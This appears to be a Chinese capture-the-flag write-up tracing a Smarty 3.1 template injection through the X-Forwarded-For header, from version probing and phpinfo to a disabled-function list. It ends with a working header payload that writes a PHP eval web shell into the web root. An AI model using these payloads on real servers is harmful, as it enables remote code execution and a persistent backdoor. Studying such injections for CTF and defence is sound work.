ailx10说：这篇是我2025年1月写的。这道题我先从 X-Forwarded-For 里观察到模板求值，再确认是 PHP 的 Smarty，引擎版本和禁用函数也得跟着查。看到 phpinfo 不代表后面每种命令执行办法都能用，限制还在等着。这篇记录的是从一个头字段的异常反应，慢慢走到模板语法和运行配置的过程。它保留了当时用来辨认版本与能力的步骤，也提醒我别把第一张成功截图当作终点：确认了注入，只说明输入到了敏感位置，实际能做到什么，还得把环境条件继续摸清楚。

测试，发现 `X-Forwarded-For` 存在模版注入，这题是PHP的 Smarty 模版引擎注入

![](/notes-assets/ef4ff0affc6d5cdaa718.webp)

查看 Smarty 版本，是 3.1 版本

```
{$smarty.version}
```

![](/notes-assets/2b64c343d529913018f4.webp)

原实验通过表达式查看 PHP 环境；表达式求值、文件写入与操作系统命令执行是不同能力。

```
{if phpinfo()}{/if}
```

![](/notes-assets/7a39f7c6082e1a07dfcf.webp)

原实验中的 phpinfo 显示部分函数被禁用；函数限制是否可绕过取决于环境与可用接口，不能一概而论。

```
dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,imap_open,ini_set,apache_setenv,symlink,link
```

原实验在该环境中尝试使用 file\_put\_contents 写入文件；此处需要结合权限、模板配置及实际结果判断。

```
X-Forwarded-For: {if file_put_contents('/var/www/html/mazi.php', '<?php eval($_POST["x"]); ?>')}{/if}
```
